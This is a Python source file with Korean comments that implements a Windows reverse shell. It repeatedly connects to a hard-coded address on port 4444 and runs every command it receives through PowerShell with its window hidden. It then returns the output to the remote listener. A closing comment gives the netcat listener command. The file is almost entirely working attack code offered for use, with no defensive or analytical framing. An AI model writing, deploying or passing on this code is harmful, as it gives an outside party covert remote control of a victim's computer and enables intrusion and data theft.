# 필요한 라이브러리 임포트

import socket  # 네트워크 연결을 위한 소켓 모듈
import subprocess  # 외부 명령 실행을 위한 서브프로세스 모듈
import time  # 시간 지연을 위한 타임 모듈

# 서버의 IP 주소 및 포트 번호 설정
ip = "192.168.186.128"
port = 4444

# 무한 루프를 사용하여 서버와의 연결을 유지
while True:
    # 소켓 객체 생성 (IPv4 주소 체계, TCP 사용)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 서버에 연결 시도
        client_socket.connect((ip, port))
        print("서버에 연결되었습니다!")
        # 서버로부터 데이터를 수신하고 처리하는 루프
        while True:
            try:
                # 서버로부터 데이터 수신 (최대 4096 바이트)
                data = client_socket.recv(4096)
                if not data:
                    # 수신된 데이터가 없으면 루프 종료
                    break
                print(data)
                # PowerShell 명령 실행을 위한 경로 설정
                powershell_path = (
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
                )
                # 수신된 데이터를 PowerShell 명령으로 실행
                proc = subprocess.Popen(
                    [
                        powershell_path,
                        data.decode("utf-8").strip(),
                    ],  # 수신된 데이터를 UTF-8로 디코딩하고 양쪽 공백 제거
                    stdout=subprocess.PIPE,  # 표준 출력 파이프 설정
                    stderr=subprocess.PIPE,  # 표준 오류 파이프 설정
                    text=True,  # 텍스트 모드 사용
                    creationflags=subprocess.CREATE_NO_WINDOW,  # 새 창을 만들지 않음
                )
                # 명령 실행 결과 및 오류 메시지 수집
                stdout, stderr = proc.communicate()
                # 실행 결과와 오류 메시지를 서버로 전송
                client_socket.sendall((stdout + stderr).encode())
            except Exception as e:
                # 명령 실행 중 예외 발생 시 오류 메시지 출력
                print(f"오류: {e}")
                break
    except Exception as e:
        # 서버 연결 실패 시 오류 메시지 출력 및 재연결 시도
        print(f"연결 오류: {e}")
        print("3초 후에 재시도합니다...")
        time.sleep(3)  # 3초 대기
    finally:
        # 소켓 닫기
        client_socket.close()


## nc -lvnp 4444
